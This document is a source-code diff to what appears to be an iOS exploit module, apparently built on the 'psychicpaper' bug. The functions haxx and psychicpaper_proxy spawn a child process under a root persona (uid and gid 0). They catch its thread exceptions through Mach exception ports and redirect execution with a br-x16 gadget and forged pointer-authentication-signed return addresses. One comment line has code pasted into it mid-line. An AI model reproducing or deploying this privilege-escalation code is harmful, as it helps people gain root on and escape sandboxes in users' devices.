@@ -19,7 +19,10 @@
 #include <string.h>
 #include <mach/mach.h>
 #include <Foundation/Foundation.h>
+#include "Header.h"
 
+extern void (*brX16Address)(void);
+extern char *_LIBC_CSTR *_LIBC_NULL_TERMINATED *_NSGetArgv(void);
 extern int posix_spawnattr_set_registered_ports_np(posix_spawnattr_t *__restrict attr, mach_port_t portarray[], uint32_t count);
 extern kern_return_t
 bootstrap_look_up(mach_port_t bp, const char *service_name, mach_port_t *sp);
@@ -128,7 +131,8 @@ static int handler(mach_port_t port, callback_t cb, void *arg)
         }
 #endif
         //req.state.__pc = (ptrtype)pc;
-        __darwin_arm_thread_state64_set_pc_fptr(req.state, (void*)pc);
+        req.state.__x[16] = print_pc;
+        __darwin_arm_thread_state64_set_pc_fptr(req.state, brX16Address);
         NSLog(@"Calling 0x%llx", (uint64_t)print_pc);
 
         Reply rep = {};
@@ -176,8 +180,8 @@ static int proxy_setup_cb(_STRUCT_ARM_THREAD_STATE64 *state, size_t n, void *a)
     static uint64_t portarr = 0;
     proxy_arg_t *arg = a;
 
-    // Always set lr to an invalid address so that we fault and get back here
-    state->__lr = (ptrtype)0x41414141;
+    // Always set lr to an invalid address so that we fault and get back here__darwin_arm_thread_state64_set_pc_fptr(*new_state, brX16Address);
+    __darwin_arm_thread_state64_set_lr_fptr(*state, ptrauth_sign_unauthenticated(ptrauth_strip((void *)0x41414141, ptrauth_key_function_pointer), ptrauth_key_function_pointer, 0));
     printf("proxy_setup_cb %zu\n", n);
     switch(n)
     {
@@ -256,7 +260,7 @@ static int proxy_run_cb(_STRUCT_ARM_THREAD_STATE64 *state, size_t n, void *a)
     proxy_arg_t *arg = a;
     uint32_t tmp;
 
-    state->__lr = (ptrtype)0x69696969;
+    __darwin_arm_thread_state64_set_lr_fptr(*state, ptrauth_sign_unauthenticated(ptrauth_strip((void *)0x69696969, ptrauth_key_function_pointer), ptrauth_key_function_pointer, 0));
     printf("proxy_run_cb %zu\n", n);
     if(n == 0)
     {
@@ -371,12 +375,12 @@ static void* proxy_server(void *a)
     return NULL;
 }
 
-static const char* err(int e)
+static const char* macherr(int e)
 {
     return e == 0 ? "success" : strerror(e);
 }
 
-mach_port_t haxx(const char *path_of_executable, volatile mach_port_t **realport)
+mach_port_t haxx(volatile mach_port_t **realport)
 {
     int r = 0;
     kern_return_t ret = 0;
@@ -423,25 +427,29 @@ mach_port_t haxx(const char *path_of_executable, volatile mach_port_t **realport
     if(r != KERN_SUCCESS) return MACH_PORT_NULL;
 
     r = posix_spawnattr_init(&att);
-    NSLog(@"posix_spawnattr_init: %s", err(r));
+    NSLog(@"posix_spawnattr_init: %s", macherr(r));
     if(r != 0) return MACH_PORT_NULL;
 
     //r = posix_spawnattr_setspecialport_np(&att, strap_port, TASK_BOOTSTRAP_PORT);
-    r = posix_spawnattr_set_registered_ports_np(&att, (mach_port_t[]){0, 0, strap_port}, 3);
-    NSLog(@"posix_spawnattr_setspecialport_np: %s", err(r));
-    if(r != 0) return MACH_PORT_NULL;
+//    NSLog(@"posix_spawnattr_setspecialport_np: %s", macherr(r));
+//    if(r != 0) return MACH_PORT_NULL;
 
     r = posix_spawnattr_setexceptionports_np(&att, EXC_MASK_ALL, exc_port, EXCEPTION_STATE_IDENTITY, ARM_THREAD_STATE64);
-    NSLog(@"posix_spawnattr_setexceptionports_np: %s", err(r));
+    NSLog(@"posix_spawnattr_setexceptionports_np: %s", macherr(r));
     if(r != 0) return MACH_PORT_NULL;
-
-    r = posix_spawn(&pid, path_of_executable, NULL, &att, (char* const*)(const char*[]){ path_of_executable, NULL }, (char* const*)(const char*[]){ NULL });
-    NSLog(@"posix_spawn: %s", err(r));
+    
+    posix_spawnattr_set_persona_np(&att, /*persona_id=*/99, POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE);
+    posix_spawnattr_set_persona_uid_np(&att, 0);
+    posix_spawnattr_set_persona_gid_np(&att, 0);
+    
+    char *argv[] = {**_NSGetArgv(), "child", NULL};
+    r = posix_spawn(&pid, argv[0], NULL, &att, argv, (char* const*)(const char*[]){ NULL });
+    NSLog(@"posix_spawn: %s", macherr(r));
     if(r != 0) return MACH_PORT_NULL;
     printf("SPAWNED PROXY pid %d\n", pid);
 
     r = posix_spawnattr_destroy(&att);
-    NSLog(@"posix_spawnattr_destroy: %s", err(r));
+    NSLog(@"posix_spawnattr_destroy: %s", macherr(r));
     if(r != 0) return MACH_PORT_NULL;
 
 //    r = xpc_pipe_receive(strap_port, &request);
@@ -466,7 +474,7 @@ mach_port_t haxx(const char *path_of_executable, volatile mach_port_t **realport
     arg->proxy_port = 0;
 
     r = pthread_create(&th, NULL, &proxy_server, arg);
-    NSLog(@"pthread_create: %s", err(r));
+    NSLog(@"pthread_create: %s", macherr(r));
     if(r != 0) return MACH_PORT_NULL;
 
     pthread_detach(th);
@@ -480,7 +488,7 @@ mach_port_t psychicpaper_proxy(mach_port_t task)
 {
     // This is just setup
     volatile mach_port_t *realport;
-    mach_port_t proxy = haxx("/usr/libexec/xpcproxy", &realport);
+    mach_port_t proxy = haxx(&realport);
     kern_return_t ret;
 //    task_t task;
 //    pid_t pid;
